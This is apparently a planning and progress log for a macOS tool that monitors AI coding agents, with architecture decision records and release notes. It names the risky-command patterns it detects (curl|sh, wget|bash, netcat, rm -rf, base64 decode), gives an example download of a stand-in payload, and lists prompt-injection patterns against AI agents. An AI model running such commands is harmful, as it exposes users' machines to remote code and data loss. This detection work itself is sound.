# sentinel

## Product Idea
watch things for safe computing.

## Additional Context
Existing project with established codebase.
- Git history: 2 commits since 2026-02-27, 1 contributor(s)
- Recent work: "Translate README to English + add social preview image", "Initial release v0.1.0 — AI Session Guardian for macOS"

## Features
- [x] CPU/온도/팬 모니터링 (psutil + macOS native)
- [x] 배터리 잔량/충전 상태/소모율 감시
- [x] 메모리/디스크 사용률 추적
- [x] AI 프로세스 탐지 (Claude, GPT, Ollama, Copilot 등)
- [x] 네트워크 트래픽 스파이크 감지
- [x] 장시간 세션/야간 작업 감지
- [x] ntfy.sh 기반 스마트 폰 알림
- [x] 보안 포스처 감시 (Firewall, Gatekeeper, FileVault)
- [x] FSWatcher — 파일 시스템 실시간 감시 (Priority 1)
- [x] NetTracker — AI 프로세스 네트워크 연결 추적 (Priority 2)
- [x] AgentLogParser — Claude Code 세션 로그 파싱 (Priority 3)
- [x] JSONL 이벤트 로깅 (Phase 2 팀 대시보드 준비)
- [x] 통합 테스트 (end-to-end security event flow)
- [x] Multi-channel notifications (macOS native + ntfy + Slack)
- [x] Critical-only alerting (warning/info log only)
- [x] MCP 인젝션 감지 — 10개 패턴, tool_result 스캔, critical 알림
- [x] pyproject.toml v0.3.0 + watchdog 의존성 반영
- [x] README 업데이트 — MCP 인젝션, Telegram, Cursor 문서화
- [x] Cursor 로그 파서 — workspaceStorage 스캔
- [x] Telegram 알림 채널 — Bot API 통합
- [ ] Existing project features

## Architecture Decisions

### AD-1: Layered Architecture (Option 3)
**결정**: 기존 시스템 모니터를 "System Layer"로 유지하고, "AI Security Layer"를 별도 모듈로 추가.
**대안 검토**:
- Option 1 (기존 AlertEngine에 통합): 코드 복잡도 급증, 단일 파일이 비대해짐
- Option 2 (별도 데몬): 두 프로세스 관리 부담, 설정 중복
- Option 3 (레이어드): 기존 코드 변경 최소, 독립적 테스트 가능, Phase 2 확장 용이
**근거**: 기존 46개 테스트를 한 줄도 수정하지 않고 유지하면서 새 기능 추가 가능. 각 collector가 독립적이라 하나가 죽어도 나머지에 영향 없음.

### AD-2: Modular Refactor (core.py -> 5 modules)
**결정**: 단일 `core.py`를 `models.py`, `collectors/system.py`, `engine.py`, `notifier.py`로 분리. `core.py`는 re-export hub + Sentinel daemon + CLI만 유지.
**근거**: AI Security Layer 추가 시 core.py가 1000줄 이상으로 비대해질 위험. 모듈 분리 후에도 `from sentinel_mac.core import AlertEngine` 같은 기존 import가 동작하도록 re-export 패턴 적용. 기존 테스트 100% 무변경 통과.

### AD-3: SecurityEvent 공통 데이터 모델
**결정**: 3개 collector(FSWatcher, NetTracker, AgentLogParser)가 모두 동일한 `SecurityEvent` dataclass로 이벤트를 전달.
**근거**: AlertEngine이 source별로 dispatch하되, 큐/로깅/직렬화 코드는 한 벌만 유지. Phase 2에서 JSONL로 기록 후 팀 서버 전송 시 포맷 통일됨. `detail: dict` 필드로 source별 추가 정보를 유연하게 담음.

### AD-4: watchdog (FSEvents) 선택
**결정**: 파일 시스템 감시에 `watchdog` 라이브러리 사용.
**대안 검토**:
- `pyfsevents`: macOS 전용이지만 유지보수 중단 상태
- Endpoint Security Framework: 가장 정확하지만 root 권한 + entitlement 필요
- `watchdog`: cross-platform, macOS에서 FSEvents 백엔드 사용, 활발한 유지보수
**트레이드오프**: watchdog은 "어떤 프로세스가 파일을 건드렸는지" 모름. `lsof` 기반 best-effort 프로세스 매핑으로 보완. 100% 정확하진 않지만 허용 가능한 수준.

### AD-5: queue.Queue 기반 이벤트 전달
**결정**: collector 스레드 -> 메인 스레드 간 `queue.Queue(maxsize=1000)` 사용.
**근거**: 스레드 안전, 표준 라이브러리, 외부 의존성 없음. 메인 루프에서 매 사이클마다 최대 100개씩 drain하여 알림 발송. 큐 가득 차면 이벤트 드롭(안전 밸브). 메인 루프가 블로킹되어도 collector는 독립 동작.

### AD-6: NetTracker — 폴링 방식
**결정**: NetTracker는 별도 스레드 없이 메인 루프에서 `poll()` 호출.
**근거**: `psutil.net_connections()`는 스냅샷 API라 이벤트 드리븐이 불가능. 30초 간격 폴링으로 충분. 스레드 하나 줄여서 복잡도 감소. 중복 연결은 (pid, ip, port) 튜플 + 5분 TTL로 deduplicate.

### AD-7: AgentLogParser — tail-f 스타일 파싱
**결정**: Claude Code JSONL 로그를 3초 간격으로 polling하며 새 줄만 읽음.
**대안 검토**:
- watchdog으로 로그 파일 감시: 이벤트 폭풍 위험 (AI가 빠르게 쓰므로)
- `inotify`/`kqueue` 직접: 플랫폼 종속 코드 증가
- polling: 단순하고 안정적, 3초 지연은 보안 모니터링에 충분
**핵심 설계**: 첫 스캔 시 기존 내용은 건너뛰고 파일 끝 위치만 기록. 이후 스캔에서 새로 추가된 줄만 파싱. 파일 truncation(크기 줄어듦) 감지 시 처음부터 다시 읽음.
**사용자 요구사항**: 로그 디렉토리가 존재하지 않으면 명시적 WARNING 로그 출력 후 시작하지 않음 (silent fail 방지).

### AD-8: High-Risk Pattern 정규식 컴파일
**결정**: 14개 위험 패턴을 모듈 로드 시 `re.compile()`로 사전 컴파일.
**근거**: 매 로그 라인마다 14개 패턴을 매칭하므로 성능이 중요. 컴파일된 패턴은 약 10x 빠름. `pip install -r requirements.txt` 같은 안전한 패턴을 false positive 없이 제외하기 위해 negative lookahead 사용.

### AD-9: 알림 쿨다운 전략
**결정**: 카테고리별 쿨다운 (기본 10분). critical 알림은 1/3 짧은 쿨다운.
**근거**: AI 에이전트가 같은 작업을 반복하면 동일 알림이 폭주. 카테고리 단위로 중복 억제하되, critical은 더 자주 알려야 하므로 짧은 쿨다운 적용. NetTracker는 추가로 (pid, ip, port) 튜플 기반 5분 TTL deduplicate.

### AD-10: Re-export 패턴으로 하위 호환
**결정**: `core.py`에서 분리된 모든 클래스를 `from sentinel_mac.core import X`로 계속 사용 가능하게 re-export.
**근거**: 기존 테스트와 `sentinel.py` 엔트리포인트가 `from sentinel_mac.core import MacOSCollector` 등을 사용 중. import 경로를 강제로 바꾸면 불필요한 churn 발생. re-export로 기존 코드 무변경 유지.

## Project Structure
```
sentinel_mac/
├── core.py                  # Sentinel daemon, config, CLI, re-exports
├── models.py                # SystemMetrics, Alert, SecurityEvent
├── engine.py                # AlertEngine (system + security event evaluation)
├── notifier.py              # NotificationManager + channels (macOS, ntfy, Slack)
├── event_logger.py          # EventLogger (daily JSONL event logging)
└── collectors/
    ├── system.py            # MacOSCollector (CPU, battery, disk, etc.)
    ├── fs_watcher.py        # FSWatcher (watchdog + lsof)
    ├── net_tracker.py       # NetTracker (psutil.net_connections + DNS)
    └── agent_log_parser.py  # AgentLogParser (Claude Code JSONL tail-f)

tests/
├── test_alerts.py           # AlertEngine system metrics tests (26)
├── test_config.py           # Config loading/validation tests (11)
├── test_notifier.py         # Notification system tests (23)
├── test_fs_watcher.py       # FSWatcher + security event alert tests (27)
├── test_net_tracker.py      # NetTracker + network event alert tests (23)
├── test_agent_log_parser.py # AgentLogParser + agent event alert tests (31)
└── test_integration.py      # EventLogger + end-to-end integration tests (11)

Total: 155 tests passing
```

## Threading Model
```
Main Thread (30s loop):
  MacOSCollector.collect() -> AlertEngine.evaluate() -> NtfyNotifier
  NetTracker.poll() -> SecurityEvent -> queue
  _process_security_events() <- drain queue -> AlertEngine -> NtfyNotifier

Thread 1 (FSWatcher):
  watchdog Observer -> _handle_fs_event() -> SecurityEvent -> queue

Thread 2 (AgentLogParser):
  3s polling -> _scan_claude_code_logs() -> parse_line() -> SecurityEvent -> queue
```

## Dependencies
- `psutil>=5.9` — system metrics, network connections, process info
- `pyyaml>=6.0` — config parsing
- `requests>=2.28` — ntfy.sh HTTP push
- `watchdog>=3.0` — macOS FSEvents file monitoring
- `pytest>=7.0` (dev) — test framework

## Tech Stack
Python 3.8+ (requires-python pinned for backward compat); core deps: psutil (system metrics), pyyaml (config), watchdog (FSEvents), requests (ntfy/Slack); optional [app] extra: rumps (menubar), ruamel.yaml (comment-preserving config edit); dev tooling: pytest, ruff (lint), mypy (type-check, lenient — strict ratchet planned for v0.9); CI: GitHub Actions on macos-latest × Python 3.9–3.13 matrix; release: PyPI Trusted Publishing via release-published trigger (no API tokens). macOS-only by design (FSEvents, lsof, launchd); Linux/Windows port deferred to v0.10+.

## Progress
- [x] v0.1.0 — Initial release (system monitoring + ntfy alerts)
- [x] v0.2.0 — Bug fixes, tests, CI/CD, English localization
- [x] Security Posture Watch (Firewall, Gatekeeper, FileVault)
- [x] AI Security Layer spec design
- [x] Modular refactor (core.py -> 5 modules)
- [x] FSWatcher implementation + 27 tests
- [x] NetTracker implementation + 23 tests
- [x] AgentLogParser implementation + 31 tests
- [x] JSONL event logging (Phase 2 prep)
- [x] Integration test (end-to-end)
- [x] Multi-channel notifications (macOS native + ntfy + Slack)
- [x] Critical-only alerting (warning/info log only)
- [x] MCP 인젝션 감지 — 10개 패턴 + critical 알림
- [x] pyproject.toml v0.3.0 + watchdog 의존성
- [x] README 업데이트 — MCP, Telegram, Cursor 문서화
- [x] Cursor 로그 파서 + Telegram 알림 채널
- [x] Forensic context for FS events (bulk change: project/process/directory tracking)
- [x] Sensitive file actor detection fallback (parent directory lsof)
- [x] Telegram notification channel configured and verified
- [x] CPU temperature monitoring via osx-cpu-temp
- [x] Duplicate instance prevention (fixed global lock path + launchctl check)
- [x] config.yaml added to .gitignore (token protection)

## Decisions
- **ADR 0001 — HostContext API + 4-tier TrustLevel (v0.6)** — NetTracker allowlist fatigue + overly-broad ssh patterns in agent_log_parser flooded users with false-positive critical alerts. HostContext introduces a single shared resolver combining three signals: ~/.ssh/known_hosts (explicit user trust → KNOWN), frequency learning over a sliding 30-day window (auto-promote LEARNED after auto_trust_after_seen), and config blocklist (negative override BLOCKED that beats KNOWN/LEARNED). 4-level TrustLevel chosen over binary so AlertEngine can downgrade severity by one step (warning→info) instead of silencing entirely — preserves audit trail. Default OFF (opt-in via security.context_aware.enabled) because frequency-based auto-trust is a real attack vector if always on. Persisted as JSONL at ~/.local/share/sentinel/host_context.jsonl (mode 0o600) with atomic rename writes and corruption quarantine (renames damaged files to .corrupted-<epoch>, never silently discards user data). API frozen by ADR; signature changes require a superseding ADR. _(2026-05-03)_
- **ADR 0002 — agent_download event + FSWatcher join (v0.7)** — Existing high-risk patterns catch curl|sh and rm -rf but miss the source-URL ↔ output-path link when an agent runs `curl https://x/payload -o /tmp/x`. Forensic gap: malicious payload lands on disk and the user has to manually correlate Bash command timestamps with FSWatcher file_create events. New event_type "agent_download" emitted alongside the existing agent_command (additive — never mutates existing events per ADR 0004 §D3). FSWatcher joins the file_create event to the originating agent_download via a 5-minute window using a new per-event UUID added to SecurityEvent (also additive). Default OFF; severity escalation: sensitive output_path → critical (e.g., curl into ~/.ssh/authorized_keys), BLOCKED or UNKNOWN URL host → warning, KNOWN/LEARNED host → info. Extraction patterns conservative: curl/wget/git clone only — pip download / brew / aria2c deferred to user demand. The duplicate event (agent_command + agent_download for the same curl command) is intentional — different semantic categories, consumers can dedupe by command hash if needed. _(2026-05-03)_
- **ADR 0003 — sentinel context CLI: 4 verbs + ruamel persistence (v0.7)** — HostContext API was Python-only after v0.6; users needed an inspect/mutate surface accessible from the shell. Frozen 4 verbs: status / forget / block / unblock — chosen over more granular CRUD because the verbs map to user intent (read state, drop a learned host, hard-deny a host, undo a deny). status is read-only (works regardless of context_aware.enabled); forget mutates the runtime cache; block/unblock persist to config.yaml in-place via ruamel.yaml round-trip (preserves comments and key order so users editing config in their editor don't lose annotations). Daemon-independent design: all four verbs work whether the daemon is running or not, so users can prepare state before opting in. Mutating verbs probe sentinel.lock with non-blocking flock to detect a running daemon without waking it. Stays in stdlib argparse (no click/typer dependency). All verbs accept --json producing the ADR 0004 §D2 versioned envelope; exit codes 0/1/2/3/4 mapped per §D6. Three envelope kinds frozen: host_context_status, host_context_host_detail, host_context_mutation. _(2026-05-03)_
- **ADR 0004 — Pro branch optionality: design constraints, no Pro code (v0.7)** — User confirmed Pro/team paid plans are a real future option but explicitly deferred for v0.8/v0.9 ("팀단위 유료플랜은 뒤로 하고 서비스 성능 자체에 집중"). This ADR is constraints, not features — what we deliberately don't decide so future Pro work can land without ripping up OSS schemas. Six binding constraints across the v0.7+ surface: (D1) no license_key field in OSS until a concrete first Pro feature ships (no dead code); (D2) all --json outputs use a versioned envelope `{version, kind, generated_at, data}` — Pro tooling can rely on (version, kind) for dispatch; (D3) SecurityEvent.detail schemas additive forever, never reuse keys for new meanings, new event_types for new shapes; (D4) blocklist / custom_rules / notification channels stay layer-able for future managed sources via additive merge; (D5) audit log forwarding wraps event_logger via a single call site, OSS shape unchanged; (D6) telemetry stays opt-in (Privacy promise from v0.6 README intact). Explicit non-decisions: pricing model, OSS license boundary, distribution channel, telemetry posture. This ADR has been the single most-cited cross-reference in subsequent ADRs (0002 D1, 0003 D5, 0005 D7, 0006 D3, 0007 D2/D3) — proves the constraints earn their keep. _(2026-05-03)_
- **ADR 0005 — SIGHUP daemon reload protocol (v0.8)** — Single biggest UX paper-cut from v0.7 — `sentinel context block evil.com` had no effect on the running daemon until `sentinel restart`. SIGHUP chosen over SIGUSR1/SIGUSR2 (POSIX standard for "reload your config"; ops engineers can `kill -HUP $(cat sentinel.lock)` directly). Atomic-or-nothing reload sequence: build new components into local variables, swap under threading.RLock as the only `self.*` mutation. Sub-second latency via dedicated reload-worker thread that wait()s on a threading.Event — NOT bound to the metric tick (default 30s) or status interval (default 60min). Multiple SIGHUPs in rapid succession coalesce to one reload. NOT reloaded (deliberately preserved): notifier rate-limits, AlertEngine cooldowns, agent_log tail offsets, typosquatting hardcoded set — these are operational state that reset would degrade UX. CLI auto-signals the daemon via lock-file PID after mutation succeeds; envelope additive `daemon_reload` field with three values {applied, skipped_not_running, failed_unreachable}. Read-side instrumentation deferred to Track 1c (PR #22) — main loop and queue drainer take the same lock briefly to snapshot a 4-tuple (engine, host_ctx, event_logger, security_rules) so a mid-cycle swap cannot surface partially-replaced state. _(2026-05-03)_
- **ADR 0006 — ruamel→PyYAML auto-fallback for config mutation (v0.8)** — ADR 0003 §D2 required the [app] extra (ruamel.yaml) for `sentinel context block`/`unblock` — pipx install sentinel-mac alone failed with exit 3. UX gap: user wants to add one host to the blocklist; should not need to install a YAML library. ruamel-first / PyYAML automatic fallback (no flag, no exit 3). Backup-then-write safety net: shutil.copy2 to config.yaml.bak.<unix_epoch> mode 0o600, never auto-deleted (deleting user data without explicit opt-in is the worst-case sin for a fallback whose entire purpose is "do not silently destroy data"). Single-line stderr warning under ~120 chars (with ~/ path substitution under HOME) plus uniform JSON envelope additive fields (yaml_backend, backup_path, comment_preservation) — same shape on both backends so consumers do not branch. PyYAML write uses sort_keys=False to preserve key order even though comments are lost. Supersedes ADR 0003 §D2 (ruamel-only persistence) and §D6 (exit code 3 for ruamel-missing — now exit 0 if PyYAML write succeeds). Future cleanup-backups CLI is v0.9 §D5 follow-up. _(2026-05-03)_
- **ADR 0007 — Forensic context: detail.session + detail.project_meta + alert [ctx] block (v0.8)** — User report drove this: a typosquatting alert fired but actor_name="claude_code" was true for every agent_log event ever recorded — no way to know WHO/WHERE/WHAT/HOW from a single alert ("어디서 누가 뭐하다 실행된건지 알 수가 없네?"). Solution: extract Claude Code session metadata from JSONL (sessionId/cwd/version/gitBranch from the first user message; model from the first assistant message — defensive against upstream key changes) + walk up cwd to a project boundary (first .git/pyproject.toml/package.json wins, max 10 parents) + render Project/Session/Where/What lines in alert message. Field named detail.project_meta (NOT detail.project) because fs_watcher.bulk_change already used detail["project"] as a string and ADR 0004 §D3 forbids repurposing keys — naming collision avoided by adding a new structured key alongside the legacy string. Privacy boundary D7: git.remote is recorded in JSONL audit log but NEVER appears in the alert message (avoids leaking private repo identity to opt-in notification channels — Slack/ntfy/Telegram). Project name + git.branch ARE surfaced (already visible in any chat where the user discusses their work). ProjectContext: bounded LRU + 5-min TTL, mirrors HostContext injection pattern. NOT reloaded on SIGHUP (D5): cache is a pure optimization; TTL absorbs filesystem changes lazily. net_tracker intentionally NOT enriched (per-connection cwd would require lsof per emitted event — fork/exec cost unacceptable on a high-frequency stream). _(2026-05-03)_

## Snapshot Log

### v1 - Initial Setup
- Project initialized with pmpt

### v2 - Security Posture Watch
- Added security posture monitoring for Firewall, Gatekeeper, and FileVault.
- Added `security_posture` alert generation and surfaced security status in periodic reports and `--once` output.
- Fixed two baseline regressions (`load_config` non-mapping YAML handling, cooldown timestamp behavior).
- Test result: `46 passed`.

### v3 - AI Security Layer Foundation
- Decided on Option 3: layered architecture (system layer + AI security layer).
- Created AI Security Layer spec (`ai-security-layer-spec.md`).
- Refactored `core.py` into modular structure with re-export backward compatibility.
- Added `SecurityEvent` data model for upcoming security collectors.
- Test result: `46 passed` (zero regression).

### v4 - FSWatcher Implementation
- Implemented `collectors/fs_watcher.py`: watchdog Observer + lsof-based process attribution.
- Detects sensitive path access (~/.ssh, .env), executable file creation, AI process file activity, bulk changes.
- Added `evaluate_security_event()` to AlertEngine for SecurityEvent -> Alert conversion with cooldown.
- Integrated FSWatcher into Sentinel daemon via shared `queue.Queue` + drain loop.
- Test result: `73 passed` (+27 new).

### v5 - NetTracker Implementation
- Implemented `collectors/net_tracker.py`: psutil.net_connections polling, reverse DNS caching, fnmatch allowlist.
- Tracks AI process outbound connections. Flags unknown hosts (warning), unknown + non-standard port (critical).
- Duplicate connection deduplication with 5-min TTL.
- Test result: `96 passed` (+23 new).

### v6 - AgentLogParser Implementation
- Implemented `collectors/agent_log_parser.py`: Claude Code JSONL session log parser with tail-f style reading.
- 14 compiled HIGH_RISK_PATTERNS: curl|sh, wget|bash, chmod+x, ssh, rm -rf, base64 decode, netcat, pip/npm install, etc.
- Parses `tool_use` content blocks: Bash (command risk check), Write (sensitive path detection), WebFetch (URL fetch logging).
- Background thread with 3s polling, skips existing content on first scan, tracks file positions per session.
- Explicit WARNING log when configured log directories are not found (user requirement).
- Test result: `127 passed` (+31 new).

### v7 - JSONL Event Logging + Integration Tests
- Implemented `event_logger.py`: append-only JSONL event logger with daily file rotation.
- All SecurityEvents are now logged to `<data_dir>/events/YYYY-MM-DD.jsonl` before alert evaluation.
- Phase 2 팀 대시보드 준비: 로컬 JSONL에 모든 이벤트 기록, 나중에 `Uploader`만 추가하면 서버 전송 가능.
- Integrated EventLogger into Sentinel daemon (`_process_security_events` drain loop + shutdown close).
- 11 new tests: EventLogger unit tests (6) + end-to-end integration tests (5).
  - Integration tests verify: FSWatcher -> critical alert + JSONL, NetTracker -> warning + JSONL, AgentLogParser -> critical + JSONL, queue drain flow, safe events logged without alerts.
- Test result: `138 passed` (+11 new).

### AD-11: JSONL Event Logging (Phase 2 준비)
**결정**: 모든 SecurityEvent를 알림 발송과 동시에 일별 JSONL 파일에 기록.
**근거**: Phase 2 팀 대시보드에서 이벤트 히스토리가 필요. 지금부터 로컬에 기록해두면 (1) 개인 사용자도 감사 이력 확인 가능, (2) Phase 2에서 `Uploader` 모듈만 추가하면 됨. 알림이 발생하지 않는 이벤트도 기록하여 완전한 감사 로그 확보. daily rotation으로 파일 관리 용이.

### v8 - Multi-channel Notification + Critical-only Alerting
- Redesigned notification system: single `NtfyNotifier` -> multi-channel `NotificationManager`.
- 3 notification channels: macOS native (osascript, 기본값), ntfy.sh (선택), Slack webhook (선택).
- "값이 있으면 활성화" 패턴: `ntfy_topic`에 값 넣으면 ntfy 활성화, `slack_webhook`에 URL 넣으면 Slack 활성화. 별도 on/off 불필요.
- **Critical-only 알림 원칙**: critical 알림만 채널로 발송, warning/info는 로그에만 기록. "감시는 전부, 알림은 최소."
- macOS native notification: `osascript display notification` 사용, critical은 사운드 포함.
- Config 구조 변경: `ntfy_topic`/`notifications_enabled` -> `notifications:` 블록. 기존 top-level `ntfy_topic` 하위 호환 유지.
- `--init-config` 생성 config 업데이트, `--test-notify`는 NotificationManager 사용.
- 23 new notifier tests (NtfyNotifier 5, MacOSNotifier 4, SlackNotifier 2, NotificationManager 12).
- Test result: `155 passed` (+17 net new, 6 old replaced).

### AD-12: Multi-channel Notification + Critical-only Delivery
**결정**: macOS 네이티브 알림을 기본 채널로, critical 이벤트만 알림 발송.
**대안 검토**:
- ntfy.sh만 유지: 초기 설정이 필요해서 "설치하면 바로 동작" 원칙에 위배
- 모든 레벨 알림: 오탐이 많으면 유저가 Sentinel을 끔. 보안 도구의 가장 큰 적은 알림 피로
**핵심 원칙**: "감시는 전부, 알림은 최소." Warning/Info는 JSONL 감사 로그에 기록되므로 데이터 손실 없음. Critical만 즉시 알림으로 유저 주의를 끔.
**"값이 있으면 활성화" 패턴**: `slack_webhook: "https://..."` -> Slack 자동 활성화. 유저가 별도 `enabled: true`를 설정할 필요 없음. 비어있으면 꺼짐.
**하위 호환**: 기존 top-level `ntfy_topic` 설정도 계속 동작. `notifications.ntfy_topic`이 명시되어 있으면 우선.

### AD-13: macOS 전용 전략 (Linux 미지원)
**결정**: Linux 지원을 보류하고 macOS에 집중.
**대안 검토**:
- Linux 지원 추가: 코드의 90%가 이미 크로스 플랫폼이지만, system.py의 70%가 macOS 전용 (pmset, ioreg, spctl 등). LinuxCollector 구현 + 2개 플랫폼 테스트/유지 부담.
- 결론: AI 코딩 에이전트(Claude Code, Cursor)의 주 사용 환경이 macOS 데스크탑. Linux 서버는 이미 Prometheus/Grafana 등 성숙한 도구가 있음.
**근거**: macOS에서 확실한 PMF를 먼저 잡고, 유저 요청이 있으면 그때 Linux 지원 추가. 지금은 MCP 인젝션 감지 같은 차별화 기능에 리소스 집중.

---
*This document tracks project progress. Update it as you build.*
*AI instructions are in `pmpt.ai.md` -- paste that into your AI tool.*

### v9 — 2026-03-06
- Updated project plan: decided macOS-first strategy (AD-13), dropping Linux support to focus on differentiation features
- Reorganized Planned/Next sections — MCP injection detection is now top priority as Sentinel's key differentiator
- Cleaned up duplicate snapshot logs from v8 backfill
- Updated pmpt.ai.md What's Next to reflect new priorities

### v10 — 2026-03-06
- Implemented three major features: (1) MCP injection detection with 10 compiled patterns scanning tool_result responses for prompt injection (system tags, instruction overrides, role hijacking, concealment, HTML injection, urgency manipulation, token boundaries, fake system prompts) — triggers critical alerts
- MCP tool calls are also tracked as informational events
- (2) Cursor log parser support via workspaceStorage scanning for AI conversation JSONL/JSON files
- (3) Telegram notification channel using Bot API with "value means enabled" pattern (bot_token + chat_id)
- Also bumped version to 0.3.0, added watchdog dependency, and updated README with MCP injection docs and Telegram setup
- 180 tests passing (+25 new)

### v11 — 2026-03-06
- v0.3.0 release: Added AI Security Layer with three new collectors — FSWatcher (macOS FSEvents file monitoring with process attribution), NetTracker (outbound connection tracking with allowlist and reverse DNS), and AgentLogParser (Claude Code + Cursor log parsing with 11 high-risk command patterns)
- Implemented MCP injection detection scanning tool_result entries against 10 compiled regex patterns for prompt injection attempts
- Added Telegram notification channel alongside existing macOS/ntfy/Slack
- All security events flow through a thread-safe queue to a JSONL audit logger with daily rotation
- README rewritten with new tagline "A seatbelt for your AI", config.yaml comments translated to English, and table rendering fixes
- 180 tests passing

### v12 — 2026-03-13
- **Forensic context enhancement**: Bulk file change events now record project name (auto-detected via .git/package.json), suspect process (lsof on top directories), and affected directory list in JSONL events and alert messages
- **Sensitive file actor detection improved**: Added parent directory lsof fallback when direct file lsof fails (catches build processes like node)
- **Telegram notifications activated**: Configured bot token + chat_id, verified message delivery
- **CPU temperature monitoring enabled**: Installed osx-cpu-temp via Homebrew, updated system collector to use shutil.which with /usr/local/bin fallback for daemon environments
- **Duplicate instance prevention fixed**: Lock file path changed from cwd-dependent to fixed ~/.local/share/sentinel/sentinel.lock; `sentinel start` now checks launchctl list before loading plist, shows "already running" instead of silently starting a second instance
- **config.yaml added to .gitignore** to prevent Telegram bot token from being committed

### v12 — 2026-05-03
- v0.8.0 release shipped to PyPI — 17 PRs collapsed into one wheel since v0.5.3 (2026-04-30)
- Three internal themes: v0.6 added context-aware detection (HostContext with known_hosts + frequency learning + blocklist override) so Sentinel can downgrade alerts on hosts the user has historically interacted with, cutting false positives without silencing the audit trail
- v0.7 added user-facing power features — `--report --since 7d --severity critical --type agent_command --json` filters with a versioned envelope, agent_download tracking that joins curl/wget source URLs to their output files via a 5-minute FSWatcher window, the `sentinel context` CLI for inspecting and mutating the host trust cache, and README install guidance for pipx
- v0.8 turned Sentinel from a "detection tool" into a "forensic tool that explains what AI agents did and lets you act on it without restarting the daemon": SIGHUP-driven sub-second daemon reload, ruamel→PyYAML automatic config-mutation fallback (so `pip install sentinel-mac` alone is now sufficient), `sentinel doctor` health check, a forensic [ctx] block in every alert that surfaces project name + git branch/commit + Claude Code session id + cwd (privacy: git.remote stays audit-log-only), and audit-log severity consistency on all event types so `--report --severity critical` correctly catches Bash high-risk commands and MCP injection
- Seven Architecture Decision Records (ADR 0001–0007) freeze the contracts; 256 → 680 tests; ~5.7K LOC added
- PyPI publish via Trusted Publishing (no API tokens)
- Plan for v0.9 captured in docs/proposals/v0.9-plan.md (PR #24): polish + performance theme — measure-first profile pass, mypy strict ratchet, bundled small UX wins
- Tier 4 (dashboard / cross-platform Linux / Pro) explicitly deferred to v0.10+
